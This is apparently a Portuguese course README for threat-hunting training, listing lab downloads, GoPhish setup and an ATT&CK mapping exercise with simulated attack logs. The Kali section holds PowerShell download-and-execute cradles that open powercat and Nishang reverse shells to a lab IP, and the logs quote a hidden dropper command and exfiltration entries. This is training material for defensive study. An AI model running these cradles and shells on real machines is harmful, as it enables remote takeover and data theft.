# THA-ADINT
Repositório de links para o Treinamento Threat Hunting Analist da ADINT School

## Módulo 00

## Download do Virtual Box, Extension Pack, Kali Linux, Metasploitable e ISOS(Windows e Ubuntu)

### VirtualBox Package and Virtual Box Extension Pack
https://www.virtualbox.org/wiki/Downloads

### Kali Download: 
https://www.kali.org/get-kali/#kali-virtual-machines

### Metasploitable:
https://drive.google.com/file/d/1QQwcYOcoKg4zAUEB0xS5urE53H4xWgv_/view?usp=drive_link

### Windows 10:
https://drive.google.com/file/d/12xLX9p-XiLgWqn1eLAse1OUe8QsqScqQ/view?usp=drive_link

### Ubuntu Server: 
https://ubuntu.com/download/server

## Kali Linux
### Atualização
```
$ sudo su
# apt update
# apt upgrade -y
```
### GoPhish
https://github.com/gophish/gophish
```
$ sudo mkdir /opt/git
$ sudo chown -R kali:kali /opt/git/
$ cd /opt/git
$ git clone https://github.com/gophish/gophish.git
$ cd gophish
$ ls -l
$ sudo apt install golang -y
$ go build
```
### PowerCat
https://github.com/besimorhino/powercat
```
$ mkdir ~/THA/
$ cd ~/THA/
$ wget https://raw.githubusercontent.com/besimorhino/powercat/refs/heads/master/powercat.ps1

IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.56.101/powercat.ps1'); powercat -c 192.168.56.101 -p 443 -e cmd
```
### Invoke-PowerShellTCP
https://github.com/samratashok/nishang
```
$ cd ~/THA/
$ wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1

Invoke-PowerShellTcp -Reverse -IPAddress 192.168.56.101 -Port 4444
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.101/Invoke-PowerShellTcp.ps1')
```

## Windows 10

### Office 2013
https://drive.google.com/file/d/11wmov4jpwOzQ2A0Rq0osQ4-YjdfsLTEV/view?usp=drive_link

## Ubuntu - OpenCTI

### OpenCTI

## Ubuntu - Wazuh

### Wazuh

## 01 Fundamentos de Threat Hunter

### APT28 Fancy Bear
https://en.wikipedia.org/wiki/Fancy_Bear

### O grupo APT28 ataca agências governamentais ucranianas através do Signal usando malware
https://csirt.csi.cip.gov.ua/en/posts/apt28-attacks-ukrainian-government-agencies-via-signal-using-malware

### CTIR Gov - Centro de Prevenção, Tratamento e Resposta a Incidentes Cibernéticos de Governo
https://www.gov.br/ctir/pt-br/assuntos/noticias/2023/ameaca-cibernetica-ativa-emotet-e-trickbot

### app do Google
https://myaccount.google.com/apppasswords

### Teste Web
http://testphp.vulnweb.com/login.php

### Desafio 2: Mapeamento de TTPs com MITRE ATT&CK - Logs
```
1. Log de e-mail (Phishing inicial)
Fonte: Mail Gateway
Timestamp: 2025-10-04T08:15:23Z  
From: hr@secure-docs[.]org  
To: finance.director@targetcorp.com  
Subject: Atualização de política de benefícios 2025  
Attachment: Benefits_Update_2025.doc  
Verdict: Suspicious macro detected

2. Log de execução de macro (Office)
Fonte: Endpoint EDR
Timestamp: 2025-10-04T08:16:02Z  
Host: FINANCE-PC01  
Process: WINWORD.EXE  
Child Process: powershell.exe  
Command Line: powershell -exec bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://update-sync[.]org/dropper.ps1')"  
Verdict: Malicious PowerShell execution

4. Log de movimentação lateral via SMB
Fonte: Network Sensor (Zeek)
Timestamp: 2025-10-04T08:20:12Z  
Source IP: 10.0.5.21  
Destination IP: 10.0.5.45  
Protocol: SMB  
Action: File transfer – `update.ps1` copied to `\\10.0.5.45\C$\Users\Public\`  
Verdict: Lateral movement suspected

5. Log de exfiltração via HTTP/S
Fonte: Proxy Logs
Timestamp: 2025-10-04T08:25:33Z  
Host: FINANCE-PC01  
Destination: secure-data[.]net  
URL: https://secure-data[.]net/api/upload?session=abc123  
Payload Size: 4.2 MB  
Verdict: Unusual outbound data transfer

6. Log de beaconing (C2)
Fonte: Firewall Logs
Timestamp: 2025-10-04T08:30:00Z  
Source IP: 10.0.5.21  
Destination IP: 182.92.158.231  
Protocol: TCP  
Port: 443  
Frequency: Every 5 minutes  
Verdict: Persistent outbound connection to known APT10 infrastructure
```

### MITRE Navigator
https://mitre-attack.github.io/attack-navigator/

